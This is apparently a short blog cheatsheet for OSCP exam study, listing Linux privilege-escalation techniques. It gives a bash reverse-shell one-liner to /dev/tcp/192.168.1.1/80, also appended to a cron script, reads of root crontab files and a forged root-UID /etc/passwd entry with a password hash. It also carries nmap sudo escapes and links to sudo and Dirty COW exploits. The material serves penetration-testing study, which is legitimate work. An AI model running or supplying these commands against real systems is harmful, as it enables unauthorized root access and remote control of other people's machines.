---
title: Linux Privilege Escalation
author: linatl
date: "2021-03-23 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Upgrading Shells
```
Upgrade sh to bash using python2
> python -c 'import pty; pty.spawn("/bin/sh")'
> python -c 'import pty; pty.spawn("/bin/bash")'

Correcting the $PATH variable for sh / bash
> export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:/bin

Upgrading from rbash:
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/

Start bash instance:
> /bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1
```

###### Sudo -l
```
List user privileges for sudo
> sudo -l

Nmap interactive
> sudo nmap --interactive
> nmap> !bash
```

###### crontabs
```
enumerating crontab:
> ls -al /etc/cron* /etc/at*
> cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/> dev/null | grep -v "^#"

Add a line to a file:
> echo "/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1" >> cleanup.sh
```

###### Writable /etc/passwd or /etc/shadow
```
Make the salt value of a password:
> openssl passwd -1 -salt ignite password
Add this line to /etc/passwd (get immediate root shell)
username:$1$ignite$tTBj87JPlfWJIFioYSmpC0:0:0:root:/root:/bin/bash
```

###### GTFObins
```
https://gtfobins.github.io/
```

###### CVE-2021-3156 (Sudo exploit)
```
64bit
https://github.com/worawit/CVE-2021-3156
```

####### Compiling C Exploits
```
> gcc exploit.c -o exploit
Installing gcc libraries for cross compiling
> sudo apt-get install gcc-multilib
> gcc -m32 -Wall exploit.c -o exploit
```

###### Dirtyc0w
```
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
Note: the /proc/self/mem file is not writable on some RHEL/CentOS versions.
```
